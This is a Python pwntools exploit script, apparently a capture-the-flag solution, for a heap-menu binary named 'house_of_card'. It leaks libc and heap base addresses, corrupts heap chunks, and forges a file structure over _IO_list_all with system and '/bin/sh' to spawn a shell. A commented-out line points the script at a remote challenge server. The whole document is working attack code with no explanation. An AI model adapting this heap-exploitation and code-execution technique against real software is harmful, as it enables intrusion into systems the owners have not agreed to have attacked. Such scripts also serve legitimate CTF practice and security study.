from pwn import *

def rec():
	r.recvuntil("Quit")
	r.recvline()
	r.recv(8)

def create(name, length, desc):
	r.sendline("1")
	r.recvuntil(":")
	r.sendline(name)
	r.recvuntil("?")
	r.sendline(str(length))
	r.recvuntil(":")
	r.sendline(desc)
	rec()

def edit(index, name, length, desc):
	r.sendline("2")
	r.recvuntil("Back.")
	r.recvuntil(">")
	r.sendline(str(index))
	r.recvuntil("?")
	r.sendline(name)
	r.recvuntil("?")
	r.sendline(str(length))
	r.sendline(desc)
	rec()

def delete(index):
	r.sendline("3")
	r.recvuntil("Back.")
	r.recvuntil(">")
	r.sendline(str(index))
	rec()

r = process("./house_of_card")#, env={"LD_PRELOAD":"./libc.so"})
#r = remote("178.128.87.12",31336)
rec()
'''
create("A"*20, 128, "B"*20)
create("C"*20, 128, "D"*4 + p64(0x414141414141))
create("E"*20, 128, "F"*1)
delete(2)

r.sendline("2")
r.recvuntil("[2] Name")
r.recvline()
r.recvline()
leak = r.recvline()
leak = struct.unpack("Q", leak[10:10+8])[0]
libcbase = leak - 0x3c1bd8

print "libcbase: " + hex(libcbase)
r.sendline("8")
rec()

edit(1, "C"*20, 136, "D"*4 + "D"*(17*8) + "/bin/sh\x00" + p64(0x61) + p64(0x0) + p64(0x69696969) + p64(0x0) + p64(0x61))
'''

create("A"*20, 4000, "B"*20)
create("A"*20, 128, "B"*20)

delete(1)
create("A", 128+8, "A")

r.sendline("2")
r.recvuntil("[2] Name")
r.recvline()
r.recvline()
sice = r.recvline()
print sice
leak = struct.unpack("Q", sice[26:26+8])[0]
heapbase = leak - 0x3c1bd8 + 0x3c1a58
leak = struct.unpack("Q", sice[10:10+8])[0]
libcbase = leak - 0x3c1bd8 - 0x590 - 0x3020


print "libcbase: " + hex(libcbase)
print "heapbase: " + hex(heapbase)
r.sendline("8")
rec()

delete(1)
delete(1)

system = libcbase + 0x45390#0x456a0#0x45390
iolistall = libcbase + 0x3c5520#0x3c2500

create("B"*30, 128, "B"*30)
create("C"*30, 128, "D"*30)
print len(p64(0x0)*3 + p64(heapbase+0x110).strip("\x00"))
create("D"*30, 128, "D"*30)
create("E"*30, 128, "D"*30)
create(p64(0x0)*3 + p64(heapbase+0x110), 128, "F"*30)
delete(2)
edit(2, p64(0x0)*3 + p64(heapbase+0x110).strip("\x00"), 128, "GGGGGGGGGGG")

edit(1, "C", 300, "D"*4 + p64(system)*15 + "/bin/sh\x00" + p64(0x61) + p64(0x0) + p64(iolistall-0x10) + p64(0x0) + p64(0x1) + p64(0x0)*16 + "/bin/sh\x00" + p64(0x61) + p64(0x0) + p64(iolistall-0x10) + p64(0x0) + p64(0x1))


r.interactive()
